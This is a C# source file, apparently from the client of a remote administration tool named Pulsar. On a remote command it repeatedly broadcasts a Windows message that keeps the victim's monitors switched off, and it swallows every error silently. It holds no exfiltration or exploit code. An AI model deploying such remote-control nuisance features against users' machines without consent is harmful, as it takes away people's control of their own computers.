using System;
using System.Runtime.InteropServices;
using System.Threading;
using Pulsar.Common.Messages.FunStuff;

namespace Pulsar.Client.FunStuff
{
    public class MonitorPower
    {
        private const int HWND_BROADCAST = 0xFFFF;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MONITORPOWER = 0xF170;
        private const int POWER_OFF = 2;
        private const int POWER_ON = -1;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        private Thread _monitorThread;
        private bool _keepOff;

        public void Handle(DoMonitorsOff message)
        {
            new Thread(() =>
            {
                try
                {
                    if (message.Off)
                    {
                        _keepOff = true;

                        _monitorThread = new Thread(() =>
                        {
                            while (_keepOff)
                            {
                                SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND,
                                    (IntPtr)SC_MONITORPOWER, (IntPtr)POWER_OFF);
                                Thread.Sleep(1000);
                            }
                        })
                        {
                            IsBackground = true
                        };
                        _monitorThread.Start();
                    }
                    else if (message.On)
                    {
                        _keepOff = false;
                        SendMessage((IntPtr)HWND_BROADCAST, WM_SYSCOMMAND,
                            (IntPtr)SC_MONITORPOWER, (IntPtr)POWER_ON);
                    }
                    else
                    {
                    }
                }
                catch (Exception ex)
                {
                }
            })
            {
                IsBackground = true
            }.Start();
        }
    }
}
